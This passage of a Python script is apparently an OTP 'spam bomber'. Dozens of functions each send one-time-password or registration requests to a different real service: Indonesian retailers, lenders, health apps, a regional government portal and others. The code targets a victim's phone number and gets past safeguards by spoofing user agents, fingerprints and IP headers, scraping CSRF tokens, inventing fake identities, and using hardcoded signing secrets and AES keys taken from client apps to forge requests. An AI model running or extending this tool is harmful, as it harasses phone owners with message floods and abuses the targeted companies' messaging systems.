        password = spam_otp_codex(10) + str(random.randint(10, 99))
        tgl = f"{random.randint(1, 28)} {random.choice(['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'])} {random.randint(1985, 2000)}"
        
        payload_reg = {
            'nama_depan': nama_depan,
            'nama_belakang': nama_belakang,
            'email': email,
            'g-recaptcha-response': '',
            'jenis_kelamin': random.choice(['Male', 'Female']),
            'konfirmasi_password': password,
            'nomor_kode_id': '100',
            'nomor_kode_value': '62',
            'nomor_ponsel': nomor_kirim,
            'password': password,
            'subscribe': 'true',
            'tanggal_lahir': tgl,
            'terms': 'true'
        }
        
        time.sleep(1)
        
        resp_reg = session.post('https://www.beautyhaul.com/ajax/account/save_register', 
                               json=payload_reg, 
                               headers=headers, 
                               timeout=10)
        
        if resp_reg.status_code != 200:
            return False
        
        time.sleep(1)
        
        resp_otp = session.post('https://www.beautyhaul.com/ajax/account/send_otp', 
                               json={'method': 'WhatsApp'}, 
                               headers=headers, 
                               timeout=10)
        
        return resp_otp.status_code < 400
        
    except:
        return False

def spam_otp_byu(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        url = 'https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp'
        headers = {'accept': 'application/json', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ3NDk2NzQiLCJhcCI6IjExMjA0MzgyNjEiLCJpZCI6IjBhZmM0ODY2ZDY3MWU5MzM3OTk3YWUxY2M5ZDEwMzI1NTQ1ZWM1YmVhMzkzMzVjIiwidHIiOiIwYWZjNDg2NmQ2NzFlOTMzNzk5N2FlMWNjOWQxMDMyNTU0NWVjNWJlYTM5MzM1YyIsImZlIjoiMTc3NzYwNzYzODUyOCIsInByIjoiMS40NzQ5MTc0LTExMjA0MzgyNjEtNTU0NWVjNWJlYTM5MzM1Yy0tMTc3NzYwNzYzODUyOCIsInR0IjoxLCJ0ayI6IjE4NjM1MTkiLCJzIjoiMDEifX0=', 'origin': 'https://pidaw-webfront.cx.byu.id', 'referer': 'https://pidaw-webfront.cx.byu.id/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'slocation': 'CL', 'traceparent': '00-0afcc4866d671e9337997ae1cc9d1032-5545ec5bea39335c-01', 'tracestate': '1863519@nr=0-1-4749174-1120438261-5545ec5bea39335c----1777607638528', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-deviceid': '17776076111271930882471', **{'x-request-id': 'a33150a0-87cd-48ea-89ad-7314024949aa'}}
        payload = {'identifier': nomor_lokal, 'channel': 'web'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_astradaihatsu2(nomor):
    try:
        if nomor.startswith('0'):
            nomor_intl = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_intl = nomor[1:]
        else:
            nomor_intl = nomor
        session = requests.Session()
        r1 = session.get('https://www.astra-daihatsu.id/register', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, timeout=10)
        csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
        if csrf:
            csrf_token = csrf.group(1)
            r2 = session.post('https://www.astra-daihatsu.id/otp/whatsapp/generate', headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/json; charset=UTF-8', 'csrftoken': csrf_token, 'origin': 'https://www.astra-daihatsu.id', 'referer': 'https://www.astra-daihatsu.id/register', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, json={'phoneNo': nomor_intl}, timeout=10)
        else:
            return False
    except:
        return False

def spam_otp_astradaihatsu_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor_intl = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_intl = nomor[1:]
        else:
            nomor_intl = nomor
        session = requests.Session()
        r1 = session.get('https://www.astra-daihatsu.id/register', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, timeout=10)
        csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
        if csrf:
            csrf_token = csrf.group(1)
            r2 = session.post('https://www.astra-daihatsu.id/otp/sms/generate', headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/json; charset=UTF-8', 'csrftoken': csrf_token, 'origin': 'https://www.astra-daihatsu.id', 'referer': 'https://www.astra-daihatsu.id/register', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, json={'phoneNo': nomor_intl}, timeout=10)
        else:
            return False
    except:
        return False

def spam_otp_vedantu(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        
        session = requests.Session()
        session.get('https://www.vedantu.com/', 
            headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            timeout=10
        )
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.vedantu.com',
            'referer': 'https://www.vedantu.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'cookie': 'v-auth-token=8HQ63zA7QqVd8mMu; auth-token=8Hq63zA7QqVd8mMU'
        }
        
        payload = {
            "email": None,
            "phoneCode": 62,
            "phoneNumber": nomor,
            "version": 2,
            "sType": "VEDANTU_F_7_N",
            "sValue": "FC34EE3DD29934CD6723BA8151D3E"
        }
        
        url = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
        response = session.post(url, headers=headers, json=payload, timeout=15)
        
        if response.status_code == 200:
            try:
                data = response.json()
                return data.get('status') == 'SUCCESS' or data.get('success') == True
            except:
                return response.status_code == 200
        return False
        
    except Exception as e:
        return False

def spam_otp_onebunda(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        session = requests.Session()
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        resp_page = session.get('https://onebunda.com/accounts/login/', headers=headers, timeout=10)
        csrf = ''
        for line in resp_page.text.splitlines():
            if 'csrfmiddlewaretoken' in line:
                while 'value="' not in line:
                    pass
                csrf = line.split('value="')[1].split('"')[0]
        if csrf:
            resp = session.post('https://onebunda.com/accounts/login/', data={'mobile_number': nomor, 'csrfmiddlewaretoken': csrf}, headers={**headers, **{'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://onebunda.com', 'referer': 'https://onebunda.com/accounts/login/'}}, timeout=10)
        else:
            return False
    except:
        return False

def spam_otp_bonusbelanja(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        session = requests.Session()
        session.get('https://www.bonusbelanja.com/register/', headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, timeout=10)
        headers = {'accept': '*/*', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.bonusbelanja.com', 'referer': 'https://www.bonusbelanja.com/register/', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        payload = {'phone': nomor, 'name': 'Amirudin Husaeni', 'agreeContact': True, 'agreeTnc': True}
        resp = session.post('https://www.bonusbelanja.com/api/auth/registration/app', json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_swiggy(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 10))).capitalize()
        session = requests.Session()
        session.get('https://www.swiggy.com/auth', headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'Accept-Encoding': 'gzip, deflate, br'}, timeout=10)
        resp = session.post('https://www.swiggy.com/mapi/auth/signup', json={'name': nama, 'email': '', 'mobile': nomor, 'password': '', 'referral_code': '', 'countryCode': '62', 'countryKey': 'IN'}, headers={'accept': '*/*', '__fetch_req__': 'true', 'content-type': 'application/json', 'origin': 'https://www.swiggy.com', 'platform': 'mweb', 'referer': 'https://www.swiggy.com/auth/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'user-id': '0', 'Accept-Encoding': 'gzip, deflate, br'}, timeout=10)
        data = resp.json()
    except:
        return False

def spam_otp_internetrakyat(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'Accept': 'application/json, text/plain, */*', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://internetrakyat.id', 'Referer': 'https://internetrakyat.id/auth/register', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'x-api-key': '280999!FTTH'}
        resp = session.post('https://internetrakyat.id/api/app/auth/send-otp-register', json={'phone_number': nomor}, headers=headers, timeout=10)
    except:
        return False

def spam_otp_topindosms(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15', 'Mozilla/5.0 (Linux; Android 11; OPPO A54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; Xiaomi 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36']
        r = requests.post('https://www.top-indo.com/api/register/otp-request', headers={'content-type': 'application/json', 'origin': 'https://www.top-indo.com', 'referer': 'https://www.top-indo.com/register', 'user-agent': random.choice(user_agents)}, json={'uuid': str(uuid.uuid4()), 'hash': 'gruenbf12d2', 'phone': nomor, 'via': 'SMS'}, timeout=10)
    except:
        return False

def spam_otp_topindo_wea(nomor, uuid="d8145021-b056-44d1-9b44-08ba8b184939", hash="gruenbf12d2"):
    try:
        session = requests.Session()
        url = "https://www.top-indo.com/api/register/otp-request"
        
        headers = {
            'Content-Type': 'application/json'
        }
        
        payload = {
            'uuid': uuid,
            'phone': nomor,
            'via': 'WA',
            'hash': hash
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_pinjamduit(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        BASE = 'https://api.pinjamduit.co.id'
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Origin': BASE, 'Referer': BASE + '/h5/download_selfmedia.html'}
        r1 = session.post(BASE + '/gw/loan/credit-user/checkPhoneWeb', headers=headers, data={'phone': nomor, 'mobilePhone': nomor, 'uuid': str(uuid.uuid4()), 'deviceId': 'wh', 'appMarket': 'web', 'appVersion': '99.99.99', 'clientType': 'w', 'ts': int(time.time() * 1000)}, timeout=10)
        res1 = r1.json()
        if res1.get('code') != '0':
            return False
        wybs = res1['data']['wybs']
        sms_useage = 10 if res1['data']['isExist'] == 1 else 0
        headers2 = headers.copy()
        headers2['ss'] = wybs
        r2 = session.post(BASE + '/gw/loan/credit-user/checkPhoneNext', headers=headers2, data={'phone': nomor, 'mobilePhone': nomor, 'sms_service': 2, 'sms_useage': sms_useage, 'deviceId': 'wh', 'appMarket': 'web', 'appVersion': '99.99.99', 'clientType': 'w', 'ts': int(time.time() * 1000)}, timeout=10)
        res2 = r2.json()
    except:
        return False

def spam_otp_cairin(nomor):
    try:
        nomor = re.sub(r'[^0-9]', '', nomor)
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        url = 'https://app.cairin.id/v1/app/sms/sendCaptcha'
       
        data = {
            'phone': nomor,
            'type': 'registry',
            'userImei': 'wsom',
            'clientType': 'H5',
            'haveImageCode': '0',
            'fileName': 'null',
            'imageCode': 'null',
            'verifySend': 'true'
        }
        
        headers = {
            'Accept': 'application/json',
            'Origin': 'https://h5.cairin.id',
            'Referer': 'https://h5.cairin.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'platform': 'h5',
            'locale': 'yn'
        }
        
        resp = requests.post(url, data=data, headers=headers, timeout=10)
        result = resp.json()
        
        return result.get('code') == '0'
        
    except Exception as e:
        return False

def spam_otp_matahari(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = nomor
        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fitri', 'Gita', 'Hana', 'Indra', 'Joko']
        last = ['Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Wati', 'Hidayat', 'Lestari', 'Rahayu']
        nama = f'{random.choice(first)} {random.choice(last)}'
        user = ''.join(random.choices(string.ascii_lowercase, k=6)) + str(random.randint(100, 999))
        email = f'{user}@gmail.com'
        password = 'P@ss' + str(random.randint(1000, 9999)) + random.choice('!@#$%') + random.choice(string.ascii_uppercase)
        tahun = random.randint(1980, 2000)
        bulan = str(random.randint(1, 12)).zfill(2)
        hari = str(random.randint(1, 28)).zfill(2)
        tgl_lahir = f'{tahun}-{bulan}-{hari}'
        url = 'https://matahari-backend-prod.matahari.com/api/auth/register'
        headers = {'Host': 'matahari-backend-prod.matahari.com', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'Origin': 'https://matahari.com', 'Referer': 'https://matahari.com/'}
        payload = {'emailAddress': email, 'name': nama, 'mobileCountryCode': '', 'mobileNumber': nomor_lokal, 'birthDate': tgl_lahir, 'genderId': '1', 'password': password, 'cardNumber': '', 'referralCode': '', 'salesmanId': '', 'pickupStoreCode': '', 'marketingCode': ''}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_isellershop(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        r = requests.post('https://warungyeahbintan.isellershop.com/services/identity/requestOTP', headers={'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://warungyeahbintan.isellershop.com', 'referer': 'https://warungyeahbintan.isellershop.com/register', 'x-requested-with': 'XMLHttpRequest', 'x-sat': 'oCQ4sBq2nu1Bh9S3Vo7r8vImrDsZ+dvgZNzwSwJyCiI=', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, data={'destination': nomor, 'otpLength': '10'}, timeout=10)
    except:
        return False

def spam_otp_misteraladin(nomor):
    try:
        if nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('0'):
            nomor = nomor[1:]
        OTP_SECRET = '6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr'
        timestamp = int(time.time())
        member_token = hashlib.sha256(f'{OTP_SECRET}{timestamp}'.encode()).hexdigest()
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + str(int(time.time())) + '@gmail.com'
        headers_base = {'accept': 'application/json, text/plain, */*', 'accept-language': 'id', 'authorization': '', 'content-type': 'application/json', 'x-platform': 'mobile-web', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        requests.post('https://m.misteraladin.com/api/members/v2/auth/register-check', headers=headers_base, json={'email': email, 'phone_number_country_code': '62', 'phone_number': nomor}, timeout=10)
        r = requests.post('https://m.misteraladin.com/api/members/v2/otp/request', headers={**headers_base, **{'x-member-token': member_token, 'x-request-time': str(timestamp)}}, json={'phone_number_country_code': '62', 'phone_number': nomor, 'type': 'register'}, timeout=10)
    except:
        return False

def spam_otp_toss(nomor):
    try:
        if nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        resp = session.get('https://toss.tubankab.go.id/register', headers=headers)
        import re
        match = re.search("'_token':\\s*'([^']+)'", resp.text)
        if match:
            csrf = match.group(1)
            resp2 = session.post('https://toss.tubankab.go.id/register/otp/act', headers={**headers, **{'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://toss.tubankab.go.id', 'referer': 'https://toss.tubankab.go.id/register', 'x-requested-with': 'XMLHttpRequest'}}, data=f'nohp={nomor}&_token={csrf}', timeout=10)
        else:
            return False
    except:
        return False

def spam_otp_greensm(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        r = requests.post('https://gapi.indo.greensm.com/car/acquisition/create-registration', headers={'accept': '*/*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'HiringSource': 'Iklan di surat kabar atau dalam aplikasi', 'Education': 's2', 'WorkExperience': 'Sopir komersial', 'City': 'BT', 'Type': 'CAR_SHARING', 'Tel': nomor, 'Name': 'Budi Santoso', 'Country': 'ID', 'ReferralCode': '', 'Source': '', 'AffiliateNumber': '', 'Campaign': ''}, timeout=10)
    except:
        return False

def spam_otp_halodoc(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        r = requests.post('https://customers.api.halodoc.com/alor-api/v1/users/authentication/otp/requests', headers={'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'phone_number': nomor, 'channel': 'whatsapp'}, timeout=10)
    except:
        return False
        
import uuid
import random
import string
import requests
import json

def spam_otp_tiptip(nomor):
    try:
        session = requests.Session()
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
       
        if nomor.startswith('+'):
            nomor = nomor[1:]
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        fingerprint = str(uuid.uuid4())
        fingerprint_add = ''.join(random.choices('0123456789abcdef', k=32))
        ip_address = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        request_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Language': 'id',
            'Channel': 'WEB',
            'Country-Code': 'ID',
            'Channel-Device': 'Chrome',
            'Channel-Fingerprint': fingerprint,
            'Channel-Fingerprint-Additional': fingerprint_add,
            'Ip-Address': ip_address,
            'Channel-App-Version': '2.27.16',
            'Request-Id': request_id,
            'x-queueit-ajaxpageurl': 'https%3A%2F%2Ftiptip.id%2Fsign-up%3Fref%3D%252F',
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        
        payload = {
            'action': 'SIGN_UP',
            'delivery_method': 'WA',
            'phone_number': nomor,
            'country_code': '62'
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code == 200
    except:
        return False

def spam_otp_dokterin(nomor):
    try:
        if nomor.startswith('62'):
            nomor_format = nomor
        elif nomor.startswith('0'):
            nomor_format = '62' + nomor[1:]
        else:
            nomor_format = '62' + nomor
        url = 'https://api.dokterin.id/user/v1/users/login'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36', 'Accept': '*/*', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Content-Type': 'application/json', 'Origin': 'https://partner.dokterin.co.id', 'Referer': 'https://partner.dokterin.co.id/', 'x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJXZWIgQnJvd3NlciIsImRlc2NyaXB0aW9uIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0Ny4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidGltZXpvbmUiOiJBc2lhL0pha2FydGEifQ==', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'Connection': 'keep-alive'}
        payload = {'phone': nomor_format, 'tnc_accept': True, 'device': 'Blink', 'platform': 'web', 'host': 'https://partner.dokterin.co.id'}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_seva(nomor):
    try:
        import json
        import time
        import hashlib
        import base64
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        from Crypto.Random import get_random_bytes
        
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+'):
            nomor = '+62' + nomor

        def cryptojs_encrypt(data, key):
            salt = get_random_bytes(8)
            key_bytes = key.encode()

            def derive_key_iv(password, salt):
                d = b''
                d_i = b''
                while len(d) < 48:
                    d_i = hashlib.md5(d_i + password + salt).digest()
                    d += d_i
                return (d[:32], d[32:48])
            
            key_derived, iv = derive_key_iv(key_bytes, salt)
            cipher = AES.new(key_derived, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
            return base64.b64encode(b'Salted__' + salt + encrypted).decode()
        
        SECRET = 'c2ea90e6b78d9e29f3b9824e5b6bf2e84931f876f1660bf3b4c87c5a938d86d5'
        TS = str(int(time.time() * 1000))
        payload = {'phoneNumber': nomor}
        body = cryptojs_encrypt(json.dumps(payload), SECRET)
        sig_data = TS + ';' + json.dumps(payload)
        signature = cryptojs_encrypt(json.dumps(sig_data), SECRET)
        session = requests.Session()
        resp = session.post('https://api.seva.id/auth/otp/whatsapp', headers={'accept': 'application/json', 'content-type': 'text/plain', 'x-signature': signature, 'origin': 'https://www.seva.id', 'referer': 'https://www.seva.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, data=body, timeout=10)
    except:
        return False

def spam_otp_uatas(nomor):
    try:
        import json
        import time
        import base64
        
        from Crypto.Cipher import AES
        
        from Crypto.Util.Padding import pad
        
        if nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        if not nomor.startswith('0'):
            nomor = '0' + nomor

        def aes_encrypt(data, key, iv):
            key_bytes = key.encode('utf-8')
            cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
            return base64.b64encode(encrypted).decode()
